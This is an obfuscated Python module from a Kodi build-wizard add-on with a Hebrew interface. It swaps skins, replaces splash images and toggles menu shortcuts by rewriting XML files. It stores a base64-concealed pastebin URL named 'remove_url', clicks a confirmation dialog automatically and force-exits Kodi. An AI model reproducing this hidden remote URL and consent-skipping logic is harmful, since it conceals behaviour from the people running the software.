# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	OOO0O0O0000O0OO0O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O000000O00O0O00OO =[];OOO0O0O00OOOO00O0 =[]#line:261
	for O0OO0000OO000OO0O in sorted (OOO0O0O0000O0OO0O ,key =lambda OO000000O00000OOO :OO000000O00000OOO ):#line:262
		OO0OOOOOO0O0O0OO0 =os .path .split (O0OO0000OO000OO0O [:-1 ])[1 ]#line:263
		OOO0OOOO0000OO000 =os .path .join (O0OO0000OO000OO0O ,'addon.xml')#line:264
		if os .path .exists (OOO0OOOO0000OO000 ):#line:265
			OO0OO0O0OO00000OO =open (OOO0OOOO0000OO000 )#line:266
			O0O000O0O0OOO0000 =OO0OO0O0OO00000OO .read ()#line:267
			O00O0O000000O00O0 =parseDOM2 (O0O000O0O0OOO0000 ,'addon',ret ='id')#line:268
			O0O000O0OOOO00OOO =OO0OOOOOO0O0O0OO0 if len (O00O0O000000O00O0 )==0 else O00O0O000000O00O0 [0 ]#line:269
			try :#line:270
				OO0O0O00O000OOOO0 =xbmcaddon .Addon (id =O0O000O0OOOO00OOO )#line:271
				O000000O00O0O00OO .append (OO0O0O00O000OOOO0 .getAddonInfo ('name'))#line:272
				OOO0O0O00OOOO00O0 .append (O0O000O0OOOO00OOO )#line:273
			except :#line:274
				pass #line:275
	O0O00000OO00O000O =[];OOOOOOO000O0OO0OO =0 #line:276
	O00OOOOOO000O0O0O =["Current Skin -- %s"%currSkin ()]+O000000O00O0O00OO #line:277
	OOOOOOO000O0OO0OO =DIALOG .select ("Select the Skin you want to swap with.",O00OOOOOO000O0O0O )#line:278
	if OOOOOOO000O0OO0OO ==-1 :return #line:279
	else :#line:280
		OO00OO0OO00O0OOOO =(OOOOOOO000O0OO0OO -1 )#line:281
		O0O00000OO00O000O .append (OO00OO0OO00O0OOOO )#line:282
		O00OOOOOO000O0O0O [OOOOOOO000O0OO0OO ]="%s"%(O000000O00O0O00OO [OO00OO0OO00O0OOOO ])#line:283
	if O0O00000OO00O000O ==None :return #line:284
	for OOOOO000O0000OO00 in O0O00000OO00O000O :#line:285
		swapSkins (OOO0O0O00OOOO00O0 [OOOOO000O0000OO00 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OOO0OO00OOOOOOOO0 ,title ="Error"):#line:290
	OO0000OO00OO0O0OO ='lookandfeel.skin'#line:291
	OO00O0O0OOOO000OO =OOO0OO00OOOOOOOO0 #line:292
	OO0O0OO0O00000OO0 =getOld (OO0000OO00OO0O0OO )#line:293
	OO00O00OO00OO00OO =OO0000OO00OO0O0OO #line:294
	setNew (OO00O00OO00OO00OO ,OO00O0O0OOOO000OO )#line:295
	OOOO0O00OO0O0O0OO =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0O00OO0O0O0OO <100 :#line:297
		OOOO0O00OO0O0O0OO +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (O0OO0OO00OOOOOO00 ):#line:304
	try :#line:305
		O0OO0OO00OOOOOO00 ='"%s"'%O0OO0OO00OOOOOO00 #line:306
		OOOO00OO000OOOO00 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OO0OO00OOOOOO00 )#line:307
		O00O0O0000OOO0O00 =xbmc .executeJSONRPC (OOOO00OO000OOOO00 )#line:309
		O00O0O0000OOO0O00 =simplejson .loads (O00O0O0000OOO0O00 )#line:310
		if O00O0O0000OOO0O00 .has_key ('result'):#line:311
			if O00O0O0000OOO0O00 ['result'].has_key ('value'):#line:312
				return O00O0O0000OOO0O00 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O00O0O0O0000000OO ,O00000OOO0O00000O ):#line:319
	try :#line:320
		O00O0O0O0000000OO ='"%s"'%O00O0O0O0000000OO #line:321
		O00000OOO0O00000O ='"%s"'%O00000OOO0O00000O #line:322
		OO0O00OOOO00OO0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00O0O0O0000000OO ,O00000OOO0O00000O )#line:323
		OO0O00O000O0OOO00 =xbmc .executeJSONRPC (OO0O00OOOO00OO0O0 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OOO0O0000O00OOO0O =xbmcgui .DialogProgress ()#line:334
			OOO0O0000O00OOO0O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OOO0O0000O00OOO0O .update (0 )#line:338
			for OOO00O00000OOO0OO in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OOO0O0000O00OOO0O .update (int ((5 -OOO00O00000OOO0OO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OOO00O00000OOO0OO ),'')#line:341
				if OOO0O0000O00OOO0O .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OOO0O0000O00OOO0O =xbmcgui .DialogProgress ()#line:347
			OOO0O0000O00OOO0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OOO0O0000O00OOO0O .update (0 )#line:351
			for OOO00O00000OOO0OO in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OOO0O0000O00OOO0O .update (int ((5 -OOO00O00000OOO0OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOO00O00000OOO0OO ),'')#line:354
				if OOO0O0000O00OOO0O .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:364
			skindialogsettind18 ()#line:365
def rdoff ():#line:367
	resloginit .resloginit ('restore','all')#line:369
	OO0000OO00O000OOO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:370
	OOO00OO00O0O00OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:371
	copyfile (OO0000OO00O000OOO ,OOO00OO00O0O00OOO )#line:372
def skindialogsettind18 ():#line:373
	try :#line:374
		OOOOOO0000O0OO0OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:375
		O00OO00OO00OOOO0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:376
		copyfile (OOOOOO0000O0OO0OO ,O00OO00OO00OOOO0O )#line:377
	except :pass #line:378
def rdon ():#line:379
	loginit .loginIt ('restore','all')#line:380
	OO00OO0OO000O00O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:382
	O0OO00OO0O0O0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:383
	copyfile (OO00OO0OO000O00O0 ,O0OO00OO0O0O0OO0O )#line:384
def adults18 ():#line:386
  OOO0O0OO0OOOOOOOO =(ADDON .getSetting ("adults"))#line:387
  if OOO0O0OO0OOOOOOOO =='true':#line:388
    O0OOO0OOOOOO0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:389
    with open (O0OOO0OOOOOO0OOO0 ,'r')as O0OOO0OO000OOOO00 :#line:390
      O00OO00000O00O0O0 =O0OOO0OO000OOOO00 .read ()#line:391
    O00OO00000O00O0O0 =O00OO00000O00O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:409
    with open (O0OOO0OOOOOO0OOO0 ,'w')as O0OOO0OO000OOOO00 :#line:412
      O0OOO0OO000OOOO00 .write (O00OO00000O00O0O0 )#line:413
def rdbuildaddon ():#line:414
  O0OO0O0OOOO0O0O00 =(ADDON .getSetting ("rdbuild"))#line:415
  if O0OO0O0OOOO0O0O00 =='true':#line:416
    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:417
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:418
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:419
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:437
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:440
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:441
    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:445
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:446
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:447
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:465
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:468
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:469
    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:473
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:474
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:475
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:493
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:496
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:497
    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:501
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:502
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:503
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:521
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:524
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:525
    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:528
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:529
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:530
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:548
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:551
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:552
    OO0OOO00OOO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:554
    with open (OO0OOO00OOO0OO0O0 ,'r')as O0O0OO0O00OO0OO00 :#line:555
      OO00OOO00OOOO0000 =O0O0OO0O00OO0OO00 .read ()#line:556
    OO00OOO00OOOO0000 =OO00OOO00OOOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:574
    with open (OO0OOO00OOO0OO0O0 ,'w')as O0O0OO0O00OO0OO00 :#line:577
      O0O0OO0O00OO0OO00 .write (OO00OOO00OOOO0000 )#line:578
